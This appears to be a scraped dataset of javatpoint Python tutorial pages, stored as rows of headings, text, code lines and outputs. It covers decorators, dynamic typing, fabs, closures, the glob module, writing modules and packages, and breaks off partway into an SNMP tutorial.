SCIENCE AND ENGINEERING "")', 'print (""Summation of values - {}"".format(A + B) )', 'function_1(*args, **kwargs)', '', 'return wrapper_1', 'return Inner_1', '# here, we are not using decorator', 'def my_function(*args):', 'for ele in args:', 'print (ele)', '# another way of using decorators', ""decorator_function(22, 14)(my_function)('Computer', 'Science', 'and', 'Engineering')"", 'def deco_decorator(dataType, message_1, message_2):', 'def decorator_1(function_1):', 'print (message_1)', 'def wrapper_1(*args, **kwargs):', 'print(message_2)', 'if all([type(arg) == dataType for arg in args]):', 'return function_1(*args, **kwargs)', 'return ""Invalid Input""', 'return wrapper_1', 'return decorator_1', '@deco_decorator(str, ""Decorator for \'string_Join\'"", ""stringJoin process started ..."")', 'def string_Join(*args):', ""st1 = ''"", 'for K in args:', 'st1 += K', 'return st1', '@deco_decorator(int, ""Decorator for \'summation_1\'\\n"", ""summation process started ..."")', 'def summation_1(*args):', 'summ1 = 0', 'for arg in args:', 'summ1 += arg', 'return summ1', 'print (string_Join(""I "", \'am \', ""studying "", \'Computer \', ""Science "", ""and "", ""Engineering""))', 'print ()', 'print (""The sum is equal to: "", summation_1(22, 12, 48, 133, 627, 181, 219))']","['Inside the Decorator:', 'Inside the Inner Function:', ""'Decorated the function'"", 'Inside the actual function', 'Inside the decorator', 'Inside the inner function', 'Decorated the function', 'Inside the actual function', 'Inside the Decorator', 'Inside the inner function', 'I am studying COMPUTER SCIENCE AND ENGINEERING', 'Inside the actual function', 'I am studying COMPUTER SCIENCE AND ENGINEERING', 'Summation of values - 36', 'Computer', 'Science', 'and', 'Engineering', ""Decorator for 'string_Join'"", ""Decorator for 'summation_1'"", 'stringJoin process started ...', 'I am studying Computer Science and Engineering', 'summation process started ...', 'The sum is equal to: 1242']",[],['|||Functions can be referenced to a variable.|||Functions can be passed as an argument to other functions.|||Functions can be returned from a function.|||']
332,['Dynamic Typing in Python'],"[""In this tutorial, we will understand what's dynamic typing in python.""]","['https://www.javatpoint.com/fabs-in-python', 'https://www.javatpoint.com/decorators-with-parameters-in-python', 'https://www.javatpoint.com/fabs-in-python', 'https://www.javatpoint.com/decorators-with-parameters-in-python', 'https://www.javatpoint.com/fabs-in-python']",[],[],"['Relationship Between Objects, Variables and References.', 'Shared References', 'The Disadvantage of Dynamically Typed Languages', 'Conclusion']",[],[],"['Let us see how the assignment is different in the case of Python.', 'The data type is determined at the run time.', 'Consider the program given below-', 'Explanation:', ""Let's have a look at the explanation of this program-"", 'The following sequence of steps happens when we assign a variable in Python-', 'Consider the program given below-', 'Explanation:', ""Let's understand what happened in the above program."", ""Before starting with this, let's have a look at the program-"", 'Explanation:', ""It's time to understand what exactly happened here-"", 'This is nothing but the concept of shared references which says that ""Two variables can have the same reference.""', 'One more example would make it clearer.', 'Explanation:', ""Let's have a look at the explanation of this program-""]","['Whenever we write a program in python, we come across a different set of statements, one of them is an assignment statement where we initialize a variable with a value.', 'The feature that makes a language like Java more convenient is that it is statically typed and so the bugs and the errors are reported at compile-time instead of run-time.', ""Therefore, it's a major concern for the python developers that the errors are shown during the run-time and therefore they have to develop strategies to rectify them."", 'Culminating the tutorial, we can say that python is a dynamically typed language and here we understood what are the distinct characteristics that can be observed while working on it.']","['When we talk about languages like C, C++, and Java the memory is allocated based on the data type of variable and is accessed accordingly whereas python being a dynamically typed language it stores the value at some location and then combines the respective variable name with a container.']","['a = 12.0', 'print(type(a))', 'print(type(b))', ""c = 'data'"", 'print(type(c))', 'print (a * 3)', 'print (b * 3)', 'print (c * 3)', 'a = 12.0', 'print (type(a))', 'print(type(a))', ""a = 'data'"", 'print (type(a))', 'a = 2+3j', 'print (type(a))', 'a = 12.0', 'print(a)', 'print(b)', 'a = 12.0', 'a = a * 7', 'print(a)', 'print(b)']","[""<class 'float'>"", ""<class 'int'>"", ""<class 'str'>"", '36.0', '72', 'datadatadata', ""<class 'float'>"", ""<class 'int'>"", ""<class 'str'>"", ""<class 'complex'>"", '12.0', '12.0', '84.0', '12.0']",[],"[""|||In the first step, we have initialized the variables a, b, and c with different types.|||After this, we have checked their type that comes out to be float, integer, and string respectively.|||In the next step, three of them are multiplied by three.|||Since the data type is known at the run time, the operations are performed based on the type.|||We can observe that the first value in the output is a float value, the next value is an integer, and a string is multiplied three times.|||On executing the program, the expected output is displayed.||||||We create an object in the memory that contains a value.|||If the variable name doesn't exist already, we can create it.|||The reference is assigned to the object to the variable.||||||We have initialized the variable 'a' with values of different data types.|||After this, we have checked the type of 'a' in each case.|||From this, we can infer that-||||||In the first case, a is a reference to a float object.|||In the second case, a is a reference to an integer object.|||In the third case, a is a reference to a string object.|||In the fourth case, a is a reference to a complex object.|||||||||In the first case, a is a reference to a float object.|||In the second case, a is a reference to an integer object.|||In the third case, a is a reference to a string object.|||In the fourth case, a is a reference to a complex object.||||||We have initialized the value of a as 12.0 and b as a.|||After this, we have printed the values of both a and b that comes out to be 12.0||||||We have initialized the value of a as 12.0, b as a, and then again assigned 'a' with a * 7|||After this, we have printed the values of both a and b that come out to be 84.0 for a but 12.0 in the case of b because it is still referencing the first value of a.|||""]"
333,['Fabs in Python'],['The fabs method in Python is used to return the absolute value of a number.'],"['https://www.javatpoint.com/how-to-remove-decimal-in-python', 'https://www.javatpoint.com/dynamic-typing-in-python', 'https://www.javatpoint.com/how-to-remove-decimal-in-python', 'https://www.javatpoint.com/dynamic-typing-in-python', 'https://www.javatpoint.com/how-to-remove-decimal-in-python']",[],[],['Conclusion'],"['Syntax', 'Program 1:', 'Program 2:', 'Program 3:']",[],"['It can be used by importing the math module.', 'The math module in Python can be used to implement different basic mathematical operations like addition, subtraction, division, and multiplication.', 'It can also be used to perform calculations involving exponents, logarithms, and trigonometry.', 'The syntax for using fabs in Python is-', ""It's time to have a look at some programs for a better understanding."", 'In the first program, we will discuss the basics of the fabs method.', 'Explanation:', ""Let's have a look at the explanation of this program-"", 'In the next program, we will perform some basic operations on these numbers that involve the usage of fabs().', 'The following program illustrates the same-', 'Explanation:', 'Let us see what we have done in the above program-', 'Finally, in the last program, we will perform one more mathematical operation on the numbers.', 'Explanation:', ""Let's have a look at the explanation of this program-"", 'In this Tutorial, we learned fabs() and how they can be used in Python programs to make our work much easier.']",[],[],"['math.fabs(x)', '#working of fabs()', 'import math', '# initializing the variables a, b, and c', 'a = -20.3', 'b = -30.66', 'c = 19.13', '#printing the values', 'print (""The fabs of a is: "", math.fabs(a))', 'print (""The fabs of b is: "", math.fabs(b))', 'print (""The fabs of c is: "", math.fabs(c))', '#working of fabs()', 'import math', '# initializing the variables a, b, and c', 'a = -20.3', 'b = -30.66', 'c = 19.13', '# calculating the sum', 'print (""The sum of a and b is: "", (a + b))', 'print (""The sum of b and c is: "", (b + c))', '# printing the values', 'd = math.fabs(a)', 'e = math.fabs(b)', 'f = math.fabs(c)', '#calculating sum after fabs', 'print (""The sum of d and e is: "", (d + e))', 'print (""The sum of e and f is: "", (e +  f))', '#working of fabs()', 'import math', '#initialising the variables a, b and c', 'a = -20.3', 'b = -30.66', 'c = 19.13', '#calculating the product', 'print (""The product of a and b is: "", (a * b))', 'print (""The product of b and c is: "", (b * c))', '#printing the values', 'd = math.fabs(a)', 'e = math.fabs(b)', 'f = math.fabs(c)', '#calculating product after fabs', 'print (""The product of d and e is: "", (d * e))', 'print (""The product of e and f is: "", (e * f))']","['The fabs of a is:  20.3', 'The fabs of b is:  30.66', 'The fabs of c is:  19.13', 'The sum of a and b is:  -50.96', 'The sum of b and c is:  -11.530000000000001', 'The sum of d and e is:  50.96', 'The sum of e and f is:  49.79', 'The product of a and b is:  622.398', 'The product of b and c is:  -586.5258', 'The product of d and e is:  622.398', 'The product of e and f is:  586.5258']",[],"['|||Since we have to use fabs(), we have imported the math module.|||After this, we have initialized the variables a, b, and c with positive and negative values.|||In the next step, we have passed these values to fabs() and printed them.|||On executing the program, it displays the desired output.||||||Since we have to use fabs(), we have imported the math module.|||After this, we have initialized the variables a, b, and c with positive and negative values.|||In the next step, we have printed the sum of a + b and b + c.|||Now we have passed these three variables in fabs() and stored the returned values in variables d, e, and f.|||We have calculated the sum again to check the difference between the results obtained using the values that were used for evaluation before and after passing into fabs.|||On executing the program, it displays the desired output.||||||Since we have to use fabs(), we have imported the math module.|||After this, we have initialized the variables a, b, and c with positive and negative values.|||In the next step, we have printed the product of a * b and b * c.|||Now we have passed these three variables in fabs() and stored the returned values in variables d, e, and f.|||We have calculated the product again to check the difference between the results obtained using the values that were used for evaluation before and after passing into fabs.|||On executing the program, it displays the desired output.|||']"
334,['How to Remove Decimal in Python'],['We have worked with different kind of numbers in Python and modified their type as per our need.'],"['https://www.javatpoint.com/python-closure', 'https://www.javatpoint.com/fabs-in-python', 'https://www.javatpoint.com/python-closure', 'https://www.javatpoint.com/fabs-in-python', 'https://www.javatpoint.com/python-closure']",[],[],['Conclusion'],"['Using trunc() Function', 'Using int()', 'Using split()']",[],"['In this tutorial, we will discuss how we can remove decimal in Python.', ""Let's start with a simple program,"", 'Explanation:', 'In the above program, we have declared a,b and c as 24, 19.4, and 3+4j respectively.', ""On checking their type, we came to know a belongs to class 'int', b belongs to class 'float' and c belongs to class 'complex'."", ""Here we have to work on the float numbers, so let's list out the different methods of removing decimals from numbers."", ""Let's discuss each one of them in detail-"", 'In the first program, we will make use of trunc() function and remove the decimal present in the numbers.', 'The following program illustrates the same-', 'Explanation:', ""Let's have a look at the explanation of the above program-"", ""It's time to know the second approach which is removing decimal using int()."", 'The program given below shows how it can be done-', 'Explanation:', ""Let's understand what we have done here-"", 'Finally, in the last approach, we will use the interesting split() to obtain the integer values.', 'The following program illustrates the same-', 'Explanation:', ""Let's have a look at the explanation of the above program-""]","['In this Tutorial, we started with a general idea of the type of numbers we use in Python and then learned the various methods of removing decimals from the numbers.']",[],"['print(type(a))', 'b = 19.4', 'print(type(b))', 'c = 3+4j', 'print(type(c))', 'import math', 'num_value1 = math.trunc(523.771)', 'print (num_value1)', 'print (type(num_value1))', 'num_value2 = math.trunc(21.67)', 'print (num_value2)', 'print (type(num_value2))', 'num_value3 = math.trunc(182.33)', 'print (num_value3)', 'print (type(num_value3))', 'num_value4 = math.trunc(211.54)', 'print (num_value4)', 'print (type(num_value4))', 'num_value5 = math.trunc(19.1)', 'print (num_value5)', 'print (type(num_value5))', 'num_value1 = 523.771', 'num_value2 = 21.67', 'num_value3 = 182.33', 'print (type(num_value1))', 'print (type(num_value2))', 'print (type(num_value3))', 'new_value1 = int(num_value1)', 'new_value2 = int(num_value2)', 'new_value3 = int(num_value3)', 'print (new_value1)', 'print (new_value2)', 'print (new_value3)', 'print (type(new_value1))', 'num_values=[523.771,21.67,182.33,211.54,19.1]', 'sp_lst = []', 'for ele in num_values:', ""sp_lst.append(str(ele).split('.')[0])"", 'res_list = [int(i) for i in sp_lst]', 'print(""The resultant list is: "",res_list)']","[""<class 'int'>"", ""<class 'float'>"", ""<class 'complex'>"", '523', ""<class 'int'>"", '21', ""<class 'int'>"", '182', ""<class 'int'>"", '211', ""<class 'int'>"", '19', ""<class 'int'>"", ""<class 'float'>"", ""<class 'float'>"", ""<class 'float'>"", '523', '21', '182', ""<class 'int'>"", 'The resultant list is: [523, 21, 182, 211, 19]']",[],"['|||Using trunc() function|||Using int()|||Using split()||||||Since we have to use the trunc() function, we have imported the math module.|||We have provided five different decimal values to five variables and checked their type after they are passed in the trunc() function.|||On executing the program, it displays the required output.||||||In the first step, we have provided float values to three variables and checked their type.|||After this, we have passed each variable to int() and stored them to a new variable.|||Finally, we have printed the values stored in these variables.|||On executing this program, the expected output is displayed.||||||In the first step, we have created a list that contains all the decimal values.|||After this, we have declared an empty list and appended the values in it.|||In the next step, we have taken each element from that list and passed it into an int().|||Finally, we have displayed the resultant list that contains the numbers without decimal.|||']"
335,['Python Closure'],['A language like Python has abundant concepts that are interesting and are meant to ease the work of programmers.'],"['https://www.javatpoint.com/python-glob-module', 'https://www.javatpoint.com/how-to-remove-decimal-in-python', 'https://www.javatpoint.com/python-glob-module', 'https://www.javatpoint.com/how-to-remove-decimal-in-python', 'https://www.javatpoint.com/python-glob-module']",[],[],['Conclusion'],"['Program 1:', 'Program 2:', 'Observation:', 'When We can use a Closure', 'Some More Features-', 'Program 3:']",[],"[""So, let's get started:"", 'The program given below illustrates the concept of nested functions and non local variables.', 'Explanation:', 'Let us understand what we have done in this program-', ""Now, let's see how closure can help in making our work simpler and enhancing our program."", 'The following program illustrates the same-', 'Explanation:', 'Let us understand what we have done in this program-', 'Based on the above observation, we can conclude that-', 'We can use the closure in the following conditions:', 'Features of the Closures are:', ""Finally, let's have a look at one more interesting program that uses closure."", 'The program shows the situation when we can use a closure instead of class.', 'Explanation:', 'Let us understand what we have done in the above program-', 'So, in this tutorial, we learned what are closures and when we can use them to make our program more effective.']","['In this tutorial, we will learn about python closures. But before that let us revise nested functions and see how they can act as a pre-requisite to understand this topic.']",[],"['#outer function', 'def function_1(txt):', '#inner function', 'def function_2():', 'print(txt)', '', 'function_2()', ""function_1('Python at JavaTpoint')"", '#outer function', 'def function_1(txt):', '#inner function', 'def function_2():', 'print(txt)', '', 'return function_2()', ""function_3=function_1('Let us learn a programming language.')"", 'function_3()', 'def add_num(n):', 'def addition(x):', 'return x+n', 'return addition', 'add_2=add_num(2)', 'add_8=add_num(8)', 'print(add_2(4))', 'print(add_2(8))', 'print(add_8(add_2(7)))']","['Python at JavaTpoint', 'Let us learn a programming language.', '6', '10', '17']",[],"[""|||We have created function_1 that takes the parameter txt and inside this, we have made another function that prints the value of txt.|||As we can see 'function_2' is called in the above program and then we have passed a string value in function_1.|||On executing this program, it displays the desired output.||||||We have created function_1 that takes the parameter txt and inside this, we have made another function that prints the value of txt.|||As we can see the value of 'function_2' is returned in the above program and then we have passed a string value in function_1 and allotted that to function_3.|||On executing this program, it displays the desired output.||||||With the help of closure, we can invoke functions that are outside the scope in Python.|||We can say that closure is a function object that remembers the values present in the enclosed scope.|||It is a record in which each variable of a function is mapped with the value or a reference to the name when the closure was created.|||It acts as an aid to fetch or access the variables with the help of closure copies.||||||A program must have a nested function.|||The function should refer to a value in the enclosed function.|||The enclosing function should return the nested function.||||||Closures provide a kind of data hiding in our program and so we can avoid using global variables.|||It is an efficient option when we don't have too many functions in our program.||||||The function that we created is add_num and inside this, there is another function called addition.|||This function is supposed to return the x+n value.|||In the next set of statements, we have used different ways of adding two numbers.|||On executing the program, it displays the required result.|||""]"
336,['Python Glob Module'],"[""In Python, we have many in-built modules for performing various tasks, and one of such tasks we want to perform with the Python modules is finding and locating all the files present in our system, which follows a similar pattern. This similar pattern can be a file extension, the file name's prefix, or any similarity between two or many files. We have many different Python modules with which we can easily perform this task using a Python program, but not all the modules are as efficient as others. In this tutorial, we are going to learn about one of such efficient modules, i.e., glob module in Python, with which we can perform file matching with a specific pattern by using it inside a program. We will learn in detail about the glob module in Python, how we can use it inside a program, what its key features are and the application of this module.""]","['https://www.javatpoint.com/writing-a-python-module', 'https://www.javatpoint.com/python-closure', 'https://www.javatpoint.com/writing-a-python-module', 'https://www.javatpoint.com/python-closure', 'https://www.javatpoint.com/writing-a-python-module']",[],[],"['Glob Module in Python', 'Conclusion']","['Pattern Matching Functions', 'Rules of Pattern', 'Applications of Glob Module', 'Glob Module Functions']",[],"['We will discuss the following such functions in this section:', ""Following are set of rules for the pattern that we define inside the glob module's pattern matching functions:"", 'Following are some listed applications of the Python glob module, and we can use this module in the given functions:', 'Syntax: Following is the syntax for using the iglob() function of glob module inside a Python program:', 'As we can see in the syntax of iglob() function, it takes a total of three parameters in it, which can be defined as given below:', ""Now, let's use this iglob() function in an example program so that we can understand its implementation and function in a better way."", 'Example 1:', 'Look at the following Python program with the implementation of iglob() function:', 'Explanation:', 'Following is the syntax for using the glob() function of the glob module inside a Python program:', 'Example 2: Look at the following Python program with the implementation of glob() function:', 'Following is the syntax for using the escape() function of glob module inside a Python program:', 'Example 3: Look at the following Python program with the implementation of escape() function:', 'Explanation:', 'As we can see in the output, we have all the filenames with special character sequences in their names which we defined in the program.']","['The last two functions are given in the list, i.e., os.path.expandvars() and os.path.expanduser() function can be used for the shell and tilde variable expansion in the filename pattern-matching task.', 'These are some general rules for the patterns we define inside the glob module functions for filename pattern matching tasks, and we have to follow these set of rules in order to perform the task successfully.', 'We have already discussed how pattern matching is very helpful for us when we are looking for similar files on our disk. Here, we will discuss the applications of the glob module and how it is very helpful to us.', 'So, by looking at the application of the glob module, we can say that how important this module is for us and where we can use it to reduce the complexity of the code and save our time.', '(ii) recursive: It is also an optional parameter for the iglob() function, and it takes only bool values (true or false) in it. The recursive parameter is used to set if the function is following the recursive approach for finding file names or not.', 'As we can see in the output, the first program has printed the class type of initialized variable, and then it printed the list of the files with the "".py"" extension.', 'As we can see in the above example program, we have followed the same logic as we have followed in example 1 with the iglob() function. The program has returned the list of all the filenames that match the pattern we set inside the glob() function.']","['With the help of the Python glob module, we can search for all the path names which are looking for files matching a specific pattern (which is defined by us). The specified pattern for file matching is defined according to the rules dictated by the Unix shell. The result obtained by following these rules for a specific pattern file matching is returned in the arbitrary order in the output of the program. While using the file matching pattern, we have to fulfil some requirements of the glob module because the module can travel through the list of the files at some location in our local disk. The module will mostly go through those lists of the files in the disk that follow a specific pattern only.', 'In Python, we have several functions which we can use to list down the files that match with the specific pattern which we have defined inside the function in a program. With the help of these functions, we can get the result list of the files which will match the given pattern in the specified folder in an arbitrary order in the output.', 'The first two functions present in the above-given list, i.e., fnmatch.fnmatch() and os.scandir() function, is actually used to perform the pattern matching task and not by invoking the sub-shell in the Python. These two functions perform the pattern matching task and get the list of all filenames and that too in arbitrary order. Here is a catch that the glob module treats as special cases for all the files which names begin with a dot (.) which is very unlikely in the fnmatch.fnmatch() function.', ""If any of us thinks that we can define or use any pattern to perform the pattern matching filename task, then let us clarify here that it is not possible. We can't define any pattern or use any pattern to collect the list of files with the same. We have to follow a specific set of rules while defining the pattern for the filename pattern matching functions in the glob module."", ""In this section, we will discuss all such rules which we have to keep in mind and adhere them while defining a pattern for filename pattern matching functions. We will only discuss these rules briefly and don't go in-depth about them as they are not our primary focus in this tutorial."", 'Now, we will discuss various more functions of the glob module and understand their working inside a Python program. We will also learn that how these functions help us in the pattern matching task. Look at the following list of functions that we have in the glob module, and with the help of these functions, we can carry out the task of filename pattern matching very smoothly:', 'Now, we will briefly discuss these functions and then understand the implementation of these functions by using them inside a Python program. We will use each of the above- given functions in an example program and get the list of file names following a similar pattern (that we will define in the function) in the output.', '1. iglob() Function: The iglob() function of the glob module is very helpful in yielding the arbitrary values of the list of files in the output. We can create a Python generator with the iglob() method. We can use the Python generator created by the glob module to list down the files under a given directory. This function also returns an iterator when called, and the iterator returned by it yields the values (list of files) without storing all of the filenames simultaneously.', '(i) pathname: The pathname parameter is the optional parameter of the function, and we can even leave it while we are working on the file directory that is the same as where our Python is installed. We have to define the pathname from where we have to collect the list of files that following a similar pattern (which is also defined inside the function).', ""(iii) '*': This is the mandatory parameter of the iglob() function as here we have to define the pattern for which the iglob() function will collect the file names and list them down in the output. The pattern we define inside the iglob() function (such as the extension of file) for the pattern matching should start with the '*' symbol."", 'We have first imported the glob module so that we can use the iglob() function of it in the program. After that, we have initialized a variable where we used the iglob() function, and inside the iglob() function, we have defined the pattern for which the function will perform filename pattern matching. The pattern we have defined in the iglob() function is all files with a .py extension, i.e., ""*.py"". After that, we have returned the class type of the variable we have initialized. After that, we have used a for loop on the variable to print the list of all the filenames that have matched by the iglob() function for the pattern we have defined in it.', '2. glob() Function: With the help of the glob() function, we can also get the list of files that matching a specific pattern (We have to define that specific pattern inside the function). The list returned by the glob() function will be a string that should contain a path specification according to the path we have defined inside the function. The string or iterator for glob() function actually returns the same value as returned by the iglob() function without actually storing these values (filenames) in it.', ""As we can see in the syntax of the glob() function, it also takes a total of three parameters in it, like the iglob() function. The three parameters defined in the glob() function are the same as those we have read in the iglob() function above. Now, let's use this glob() function in an example program so that we can understand its implementation and function in a better way."", '3. escape() Function: The escape() becomes very impactful as it allows us to escape the given character sequence, which we defined in the function. The escape() function is very handy for locating files that having certain characters (as we will define in the function) in their file names. It will match the sequence by matching an arbitrary literal string in the file names with that special character in them.', ""The escape() should be used with either glob() or iglob() function so that we can print the list of file names in the output as a result. Now, let's use this escape() function in an example program so that we can understand its implementation and function in a better way."", 'We have first defined a character sequence for the escape() sequence so that the escape() function will collect all the file names having that special character sequence in it. We have used a nested for loop such that first, we have created a pathname for the glob() function from the escape() function. And after that, we have used the pathname in glob() function to print the list of filenames matching the special character sequence defined earlier.', 'So, as we have used the functions of glob modules, i.e., glob(), escape() and iglob() function, we can now easily understand the functionality of the glob module and its functions. With this, we can also depict that how the glob module is very helpful in performsing the filename pattern matching task and how we can get the list of all the files that are following a specific pattern.']","['iglob(pathname, *, recursive=False)', '# Import glob module in the program', 'import glob as gb', '# Initialize a variable', 'inVar = gb.iglob(""*.py"") # Set Pattern in iglob() function', '# Returning class type of variable', 'print(type(inVar))', '# Printing list of names of all files that matched the pattern', 'print(""List of the all the files in the directory having extension .py: "")', 'for py in inVar:', 'print(py)', 'glob(pathname, *, recursive = True)', '# Import glob module in the program', 'import glob as gb', '# Initialize a variable', 'genVar = gb.glob(""*.py"") # Set Pattern in glob() function', '# Printing list of names of all files that matched the pattern', 'print(""List of the all the files in the directory having extension .py: "")', 'for py in genVar:', 'print(py)', '>> escape(pathname)', '# Import glob module in the program', 'import glob as gb', '# Initialize a variable', 'charSeq = ""-_#""', 'print(""Following is the list of filenames that match the special character sequence of escape function: "")', '# Using nested for loop to get the filenames', 'for splChar in charSeq:', '# Pathname for the glob() function', 'escSet = ""*"" + gb.escape(splChar) + ""*"" + "".py""', '# Printing list of filenames with glob() function', 'for py in (gb.glob(escSet)):', 'print(py)']","[""<class 'generator'>"", 'List of the all the files in the directory having extension .py:', 'adding.py', 'changing.py', 'code#1.py', 'code#2.py', 'code-3.py', 'code-4.py', 'code.py', 'code37.py', 'code_5.py', 'code_6.py', 'configuring.py', 'List of the all the files in the directory having extension .py:', 'adding.py', 'changing.py', 'code#1.py', 'code#2.py', 'code-3.py', 'code-4.py', 'code.py', 'code37.py', 'code_5.py', 'code_6.py', 'configuring.py', 'Following is the list of filenames that match the special character sequence of escape function:', 'code-3.py', 'code-4.py', 'code_5.py', 'code_6.py', 'code#1.py', 'code#2.py']",[],"[""|||We have to follow all the standard set of rules of the UNIX path expansion in the pattern matching.|||The path we define inside the pattern should be either absolute or relative, and we can't define any unclear path inside the pattern.|||The special characters allowed inside the pattern are only two wild-cards, i.e., '*, ?' and the normal characters that can be expressed inside the pattern are expressed in [].|||The rules of the pattern for glob module functions are applied to the filename segment (which is provided in the functions), and it stops at the path separator, i.e., '/' of the files.|||&&&|||fnmatch()|||scandir()|||path.expandvars()|||path.expanduser()||||||Sometimes, we want to search for a file that has a certain prefix in its name, any common string in the middle of the names of many files or have the same certain extension. Now, to perform this task, we may have to write a code that will scan the whole directory and then it will produce the result. Instead of it, the glob module is going to be very helpful in this case as we can use the functions of the glob module and perform this task very easily and can save our time.|||Other than this, the Glob module is also very useful when one of our programs have to look for the list of all the files in a given file system with the names of the files matching a similar pattern. Glob module can easily perform this task and that too without opening the result of the program in other sub-shell.||||||iglob()|||glob()|||escape()|||""]"
337,['Writing a Python Module'],"['It seems to be a bit difficult to create your own Python module, but what if we say that creating or writing a Python program is a very simple task.']","['https://www.javatpoint.com/modules-vs-packages-in-python', 'https://www.javatpoint.com/python-glob-module', 'https://www.javatpoint.com/modules-vs-packages-in-python', 'https://www.javatpoint.com/python-glob-module', 'https://www.javatpoint.com/modules-vs-packages-in-python']",['https://static.javatpoint.com/python/images/writing-a-python-module.png'],[],"['Python Module', 'Writing a Python Module', 'Conclusion']","['Step 1: Writing a Runnable Program:', 'Step 2: Saving the File:']",[],"['In this section, we are going to write a Python module and understand that how we can use the module, we have written inside a Python program.', 'Explanation:']","[""In this tutorial, we are going to write a Python module, and after writing it, we will also use it inside a Python script. But before all of this, let's first understand that what a Python module is."", 'A Python file that contains various statements and definitions is called a Python module, and it can have variables, classes and various functions in it. Like a simple Python script, a runnable Python code is also present inside the Python module.', 'Suppose, in a Python module, i.e., module1, three functions present in it, and we want to use only one of them in our code then we can also import only a single function by using from a statement with import like as we used below:', 'As we have learned about the Python module and have a basic idea that how a Python module works and is imported into a program, now we will move forward to the writing part of it.', ""So, let's create a Python script first and save it with the '.py' extension and save it at the same location where Python is present. Follow the following given steps to write and create a simple Python module:"", 'First, we have to write a runnable program inside the Python shell by opening a new file in it. For example, we will write the following addition function program inside the Python file:', ""Now, after writing the addition program as given in the first step, we will save the file with the 'adding.py' name in the default directory assigned by Python.""]","[""Python module becomes more useful when we group the relatable code and use them as a module inside a Python program, and with the help of a Python module, we can even make our code logically organized. We can use a Python module inside a Python program by simply using the 'import' statement."", 'We can create or write a Python module just like we create a Python script, and better to say; we can even use a Python script as a Python module inside another Python script. But this will only be valid if the Python script which we will be using as a Python module is present in the same location where the Python is installed in our system.', ""Now, we have created an 'adding' module, and this can be imported into any Python program to use its addition function for adding two variables. Let's use the 'adding' script as a Python module to perform addition operation in the following example program:"", 'In the above program, we have performed the addition operation on the two input variables we have taken from the user. We have used the addition function of adding module by importing this module inside the program. In last, we printed the addition result of the two variables in the output and ended the program.', ""We can create or write a Python module by simply writing a Python program with functions and classes in it, and then we can use the module we have created inside another program by simply importing it inside the program. We can even use a single function from the program by using an additional 'from' keyword with the import statement. With the help of a Python module, we can make our code logically organized and group similar code together in a single module.""]","['import module', 'import function1 from module1', '# A default Python function for performing addition', 'def addition(x, y): # Two variables as parameters', '# Adding two variables and storing results in another variable', 'addValue = x + y', '# Returning the addition result for two numbers', 'return addValue', '# Importing the adding module in the program', 'import adding', '# Taking two input variables from the user', 'a1 = int(input(""Enter first integer variable: ""))', 'a2 = int(input(""Enter second integer variable: ""))', ""# Adding the variables with the function of 'adding' module"", 'addResult = addition(a1, a2)', '# Printing the result in the output', 'print(""The sum of two integer variables given by you is: "", addResult)']","['Enter first integer variable: 26', 'Enter second integer variable: 24', 'The sum of two integer variables given by you is: 50']",[],[]
338,['Difference between Modules and Packages in Python'],['It is often that many coders and amateur programmers may confuse between a module and a package. The problem generally arises when it becomes hard to identify when and where a module or a package should be implemented.'],"['https://www.javatpoint.com/snmp-module-in-python', 'https://www.javatpoint.com/writing-a-python-module', 'https://www.javatpoint.com/snmp-module-in-python', 'https://www.javatpoint.com/writing-a-python-module', 'https://www.javatpoint.com/snmp-module-in-python']",[],[],"['Understanding the Modules in Python', 'Understanding the Packages in Python', 'Understanding the differences between Python Modules and Packages']",[],[],"['The python modules also store pre-defined functions from the library when the code is being executed.', 'Let us consider an example demonstrating the use of a module in Python', 'Explanation:', 'Let us consider the following example demonstrating the package in Python.', 'Explanation:', 'A python ""module"" contains a unit namespace, with the variables that are extracted locally along with some parsed functions like:', 'It becomes easier for us to employ the user-specific tools with the help of a well-structured and standard layout for the package.']","['In the following tutorial, we will discuss a clear set of differences in modules and packages in the Python programming language that will make it easy for the programmers to work more professionally while dealing with both modules and packages.', 'A module is a pythonic statement containing different functions. Modules act as a pre-defined library in the script, which is accessible to both the programmers as well as the user.', 'In the above snippet of code, we have imported the required module and used the pow() function to calculate the powers of the given number as arguments. We have then printed the value of the pow for the user.', 'In the above snippet of code, we have imported the math package that consists of various modules and functions for the programmers and printed a statement for the users.', 'There are some usually utilized tools that allow the programmers to build a new platform with the help of the modules for better code executions. This installs and distributes packages throughout the library in runtime as well.']",['A package is considered a collection of tools that allows the programmers to initiate the code. A Python package acts as a user-variable interface for any source code. This feature allows a Python package to work at a defined time for any functional script in the runtime.'],"['# importing the library and module', 'import math', 'from math import pow', '# using the pow() function', 'pow(3, 5)', '# printing pow()', 'print(pow)', '# importing the package', 'import math', '# printing a statement', 'print(""We have imported the math package"")']","['<built-in function pow>', 'We have imported the math package']",[],"['|||A Package consists of the __init__.py file for each user-oriented script. However, the same does not apply to the modules in runtime for any script specified to the users.|||A module is a file that contains a Python script in runtime for the code specified to the users. A package also modifies the user interpreted code in such a manner that it gets easily operated in the runtime.|||']"
339,['SNMP module in Python'],"['SNMP, short for Simple Network Management Protocol, is a necessary tool for SDN and is the best option to control devices in software. Even apart from this, in-application access is the primary purpose of SNMP. Without a doubt, all monitoring systems utilize SNMP in order to monitor and control servers and network devices. Having this massive strength that comes from SNMP in a script would be amazing. Hence, we will discuss the utilization of SNMP in the Python programming language in this tutorial.']","['https://www.javatpoint.com/average-of-list-in-python', 'https://www.javatpoint.com/modules-vs-packages-in-python', 'https://www.javatpoint.com/average-of-list-in-python', 'https://www.javatpoint.com/modules-vs-packages-in-python', 'https://www.javatpoint.com/average-of-list-in-python']",['https://static.javatpoint.com/python/images/snmp-module-in-python.png'],[],"['Understanding the SNMP', 'Understanding the PySNMP module', 'Preparing the environment', 'Understanding the Python SNMP Get operation', 'Understanding the Python SNMP Get Bulk', 'Understanding the Python SNMP Get Bulk Auto', 'Using Python SNMP Get Bulk & Get Bulk Auto']","['Verifying the Installation', 'Constructing Object Types', 'Fetching data', 'Providing Credentials', 'Getting the hostname']","['Note: The fetch() function depends on another function we must create: cast(). This function translates the received data from PySNMP to int, float or string.', ""Note: Here, we are not getting a list of dictionaries, but just a dictionary. This is deliberate, and the get() function will act like that at all times. Generally, we know that the function executes only once; it can't create multiple instances. Thus, we return the first element we got from fetch().""]","['But before we get started, let us discuss the SNMP.', 'Our script enables a Python program on a management station for controlling a remote device executing an SNMP agent.', 'Now, let us discuss the use of SNMP in the Python programming language with the help of the Python PySNMP module.', ""So, let's get begun."", 'The module will be installed in the system as the version of Python and pip.', 'In order to check whether the module has been installed in the system properly or not, we can try importing the module and execute the program.', 'Once the installation is complete, create a new Python file and type the following syntax in it.', 'Now, save 